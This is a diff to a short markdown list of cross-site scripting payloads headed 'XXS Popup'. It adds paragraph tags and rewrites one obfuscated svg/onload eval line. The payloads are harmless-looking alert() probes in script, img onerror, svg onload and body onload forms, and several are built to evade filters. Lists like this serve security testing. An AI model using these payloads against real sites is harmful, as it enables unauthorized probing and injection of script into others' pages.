@@ -1,5 +1,6 @@
 # Payloads
 ## XXS Popup:
+<p>
 - <script>alert("XSS");</script>
 - <script>alert(‘XSS’);</script>
 - <script>alert(‘XSS’)</script>
@@ -9,10 +10,11 @@
 - <sCripT>alert('XSS')</scRipt>
 - <img src=/ onerror="alert('XSS')"/>
 - <img src=x onMouseOver=alert('XSS')>
-- <svg/onload=eval("ale"+"rt")(/`XSS${alert/`XSS/`}/`)>
+- <svg/onload=eval("ale"+"rt")(`XSS${alert`XSS/`}`)>
 - <img src='nevermind' onerror="alert('XSS');" />
 - << script>alert("XSS");//<</ script>
 - <svg/onload=alert('XSS')>
 - div.innerHTML = '<script deferred>alert("XSS");</script>';
 - <img src="aaa" onerror=alert('xxs')>
 - <body onload="alert('XSS')">
+</p>
